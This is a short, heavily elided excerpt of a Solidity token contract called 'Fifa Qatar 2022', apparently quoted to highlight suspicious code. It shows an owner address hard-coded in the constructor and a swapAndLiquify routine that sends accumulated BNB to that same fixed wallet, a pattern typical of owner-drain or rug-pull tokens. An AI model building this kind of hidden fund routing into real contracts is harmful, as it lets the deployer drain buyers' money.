...
abstract contract Ownable is Context {
    ...
    constructor () {
         _owner = 0x936d66b68406d9043dd454Fd9d981585E78C587D;
...
contract FIFAQATAR2022 is Context, IERC20, Ownable { 
    ...
    string private constant _name = unicode"Fifa Qatar 2022"; 
    string private constant _symbol = unicode"FIFA QATAR 2022"; 
 ...
 function _transwertoken(address sender, address receivaddr, uint256 tAmount) private {
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(payable(0x936d66b68406d9043dd454Fd9d981585E78C587D), BNB_Tot);
            }
